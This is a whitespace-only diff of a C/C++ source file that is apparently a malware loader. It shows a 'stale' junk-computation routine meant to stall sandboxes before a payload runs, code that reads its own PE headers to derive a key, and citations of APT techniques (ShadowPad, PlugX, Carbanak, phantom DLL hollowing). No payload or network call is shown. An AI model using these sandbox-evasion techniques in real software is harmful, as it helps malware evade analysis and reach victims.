@@ -10,7 +10,7 @@
    exe the payload it runs some "junk code" for a while (certain mathematical operations to calculate decimals) to try
    to distract the sandbox.
 
-   TTPs references: 
+   TTPs references:
    https://st.drweb.com/static/new-www/news/2020/october/Study_of_the_ShadowPad_APT_backdoor_and_its_relation_to_PlugX_en.pdf
    https://github.com/forrest-orr/phantom-dll-hollower-poc
    https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control
@@ -18,7 +18,7 @@
 
 #include "pch.h"
 #include <math.h>
-#include <stdlib.h> 
+#include <stdlib.h>
 #include <conio.h>
 #include <tlhelp32.h>
 #include <stdio.h>
@@ -87,7 +87,7 @@ double c1(int num1) { return (4 / (num1 * pow(249.0, num1 * 1.0))); }
 
 void stale()
 {
-	// Stale code. Play with the "limit" var to look for a delay you feel happy with 
+	// Stale code. Play with the "limit" var to look for a delay you feel happy with
 	double limit = 100;
 	int j = 0;
 	double ans1 = 0.0;
@@ -122,7 +122,7 @@ DWORD getKey()
 
 	if (Module32First(hModule, &moduleEntry)) baseAddress = moduleEntry.modBaseAddr;
 	CloseHandle(hModule);
-	
+
 	ReadProcessMemory(GetCurrentProcess(), baseAddress, &dosHeader, sizeof(IMAGE_DOS_HEADER), 0);
 	ReadProcessMemory(GetCurrentProcess(), (void*)((unsigned long)baseAddress + dosHeader.e_lfanew), &ntHeader, sizeof(IMAGE_NT_HEADERS), 0);
 
